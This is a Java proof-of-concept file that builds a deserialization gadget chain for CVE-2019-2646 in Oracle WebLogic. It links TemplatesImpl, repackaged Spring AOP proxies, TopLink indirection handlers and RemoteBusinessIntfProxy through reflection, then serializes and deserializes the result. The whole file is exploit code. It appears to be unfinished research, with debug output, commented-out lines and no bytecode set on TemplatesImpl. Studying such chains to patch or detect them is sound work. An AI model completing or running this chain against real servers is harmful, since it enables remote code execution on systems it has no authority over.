package t3;

import com.bea.core.repackaged.springframework.aop.TargetSource;
import com.bea.core.repackaged.springframework.aop.framework.Advised;
import com.bea.core.repackaged.springframework.aop.framework.AdvisedSupport;
import com.bea.core.repackaged.springframework.aop.target.PrototypeTargetSource;
import com.bea.core.repackaged.springframework.aop.target.SingletonTargetSource;

import com.bea.core.repackaged.springframework.beans.factory.support.RootBeanDefinition;
import com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import oracle.toplink.indirection.ValueHolder;
import oracle.toplink.internal.indirection.ProxyIndirectionHandler;
import weblogic.ejb.container.internal.RemoteBusinessIntfProxy;
import weblogic.utils.collections.SoftHashMap;


import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.lang.reflect.*;

public class CVE_2019_2646 {
    public static void main(String[] args) throws IllegalAccessException, InstantiationException, IOException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, NoSuchFieldException {
        payload();

    }

    public static void payload() throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, IOException, NoSuchFieldException {
        TemplatesImpl templates = new TemplatesImpl();

        RootBeanDefinition rootde = new RootBeanDefinition();

        //SingletonTargetSource
        Constructor ctor1 = Class.forName("com.bea.core.repackaged.springframework.beans.factory.support.DisposableBeanAdapter").getDeclaredConstructors()[0];
        ctor1.setAccessible(true);
        Object obj = ctor1.newInstance(templates,null,rootde,null);
        SingletonTargetSource single = new SingletonTargetSource(obj);

        Class[] interfaces = single.getClass().getInterfaces();


        int length = interfaces.length;
        for(int i=0;i<length;i++){
            System.out.println(interfaces[i]);
        }



        //Class[] interfacess = new Class[]{interfaces[0],interfaces[1],};




        //PrototypeTargetSource
        PrototypeTargetSource prototy = new PrototypeTargetSource();
       /*
        String targetBeanName = "";
        prototy.setTargetBeanName(targetBeanName);
        DefaultListableBeanFactory beanFactory = new DefaultListableBeanFactory();
        prototy.setBeanFactory(beanFactory);
        prototy.setTargetClass(obj.getClass());

        */


        ValueHolder holder1 = new ValueHolder(single);
        ValueHolder holder2 = new ValueHolder(prototy);

        ProxyIndirectionHandler handler1 = new ProxyIndirectionHandler();
        handler1.setValueHolder(holder1);

        ProxyIndirectionHandler handler2 = new ProxyIndirectionHandler();
        handler2.setValueHolder(holder2);

        ProxyIndirectionHandler handler = new ProxyIndirectionHandler();


        CompositeInvocationHandlerImpl compositeInvocationHandler = new CompositeInvocationHandlerImpl();
        compositeInvocationHandler.addInvocationHandler(single.getClass(),handler1);
        compositeInvocationHandler.addInvocationHandler(prototy.getClass(),handler2);



        Object proxyInstance = Proxy.newProxyInstance(single.getClass().getClassLoader(),new Class[]{com.bea.core.repackaged.springframework.validation.BindingResult.class,TargetSource.class},compositeInvocationHandler);

        SoftHashMap softHashMap = new SoftHashMap();
        String value = "public abstract java.lang.Object com.bea.core.repackaged.springframework.aop.TargetSource.getTarget() throws java.lang.Exception";
        Method m = single.getClass().getMethod("getTarget",null);
        softHashMap.put(value,m);


        //Object proxyInstance = Proxy.newProxyInstance(CVE_2019_2646.class.getClassLoader(),interfaces,compositeInvocationHandler);


        compositeInvocationHandler.setDefaultHandler(handler);

        RemoteBusinessIntfProxy remoteBusinessIntfProxy = new RemoteBusinessIntfProxy(proxyInstance,null,null, TargetSource.class.getName());

        Field f = RemoteBusinessIntfProxy.class.getDeclaredField("newProxy");
        f.setAccessible(true);
        f.set(remoteBusinessIntfProxy,false);




        TargetSource proxyInstance1 = (TargetSource) Proxy.newProxyInstance(CVE_2019_2646.class.getClassLoader(),new Class[]{TargetSource.class},remoteBusinessIntfProxy);

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTargetSource(proxyInstance1);
        advisedSupport.setOpaque(true);

        Constructor ctor2 = Class.forName("com.bea.core.repackaged.springframework.aop.framework.JdkDynamicAopProxy").getDeclaredConstructor(AdvisedSupport.class);
        ctor2.setAccessible(true);
        InvocationHandler jdkDynamicAopProxy = (InvocationHandler) ctor2.newInstance(advisedSupport);


        Advised advisedSupport1 = (Advised)Proxy.newProxyInstance(CVE_2019_2646.class.getClassLoader(),new Class[]{Advised.class},jdkDynamicAopProxy);

        advisedSupport1.getTargetClass();






        byte[] payload2 = Ysoserial.serial(advisedSupport1);
        ByteArrayInputStream bais = new ByteArrayInputStream(payload2);
        ObjectInputStream in = new ObjectInputStream(bais);
        in.readObject();



    }


}
